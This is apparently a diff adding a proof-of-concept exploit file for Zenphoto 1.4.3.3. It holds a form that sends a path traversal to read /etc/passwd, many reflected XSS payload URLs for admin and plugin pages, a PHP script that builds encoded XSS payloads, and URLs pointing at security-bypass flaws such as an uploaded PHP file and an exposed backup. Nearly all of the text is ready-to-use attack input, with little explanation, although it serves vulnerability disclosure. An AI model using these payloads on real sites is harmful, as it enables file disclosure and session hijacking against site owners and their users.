@@ -1,0 +1,67 @@
+Information-disclosure:
+
+<html><body><center>
+<form action="http://www.example.com/zenphoto1433/zp-core/zp-extensions/uploader_flash/check.php"; method="post">
+<input type="hidden" name="folder" value="">
+<input type="hidden" name="test" value="../../../../../../../../etc/passwd">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Cross-site scripting:
+
+'zp-core/zp-extensions/cloneZenphoto/cloneTab.php'
+
+<html><body><center>
+<form action="http://www.example.com/zenphoto1433/zp-core/zp-extensions/cloneZenphoto/cloneTab.php"; method="post">
+<input type="hidden" name="path" value="');};alert(123);function q(){var w=('">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+'zp-core/zp-extensions/GoogleMap/GoogleMap.php'
+
+<?php
+error_reporting(E_ALL);
+$arr = array();
+$arr['js_alert']='</noscript><script>alert(123);</script>';
+$bz = base64_encode(bzcompress(serialize($arr)));
+$gz = base64_encode(gzcompress(serialize($arr)));
+echo "bz: $bz\n";
+echo "gz: $gz\n";
+?>
+
+SQL Injection: 
+
+http://www.example.com/zenphoto1433/zp-core/admin.php
+
+
+Security Bypass:
+
+http://www.example.com/zenphoto1433/zp-core/admin-upload.php?page=upload&tab=albums
+http://www.example.com/zenphoto1433/albums/testalbum/info.php.123png
+http://www.example.com/zenphoto1433/backup/backup-2012_10_07-19_20_15.zdb
+
+
+Cross-site Scripting:
+
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?msg=<script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?error=<script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?success=<script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?redirect="+onclick=alert(123)+w="
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/federated_logon/Verisign_logon.php?redirect="+onclick=alert(123)+w="
+http://www.example.com/zenphoto1433/themes/stopdesign/comment_form/comment_form.php?_zp_themeroot=";><script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/cloneZenphoto/cloneTab.php?success=1&msg[]=<script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/admin-thumbcrop.php?a=testalbum&i=waraxe.jpg&subpage='"+autofocus+onFocus="alert(123);//
+http://www.example.com/zenphoto1433/zp-core/admin-thumbcrop.php?a=testalbum&i=waraxe.jpg&tagsort='"+autofocus+onFocus="alert(123);//
+http://www.example.com/zenphoto1433/zp-core/admin-upload.php?folderdisplay=&apos;);alert('xss
+http://www.example.com/zenphoto1433/zp-core/admin-upload.php?albumtitle=&apos;);alert('xss
+http://www.example.com/zenphoto1433/zp-core/admin-tags.php?tagsort=";><script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/admin-users.php?page=users&mismatch=format&error=%253cscript%253ealert(123);%253c/script%253e
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/tiny_mce/plugins/tinyzenpage/tinyzenpage.php?album=';}};alert(123);var+kala={zzz+:+function(ed){var+qwe='
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/tiny_mce/config/zenpage-default-full.js.php?locale=</script><script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/admin-comments.php?sedit=1&ndeleted=<script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/admin-comments.php?ndeleted=1<script>alert(123);</script>
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/GoogleMap/m.php?data=QlpoNDFBWSZTWcu%2fgEMAAA%2bbgBBguH0AAKo13AogAFRQAAADIGVNNNGmZIMBGEgGPQOa%2flg2jGWBuiGSqXfdt1NRk8QHt7GpsF8DBGJPFBvxdyRThQkMu%2fgEMA
+http://www.example.com/zenphoto1433/zp-core/zp-extensions/GoogleMap/m.php?data=eJxLtDK0qi62srBSyiqOT8xJLSpRsi62Mra0UrLRz8svTi7KLCixs4HSYHkNQyNjTWsbfaiYknUtAP1BFmU
+
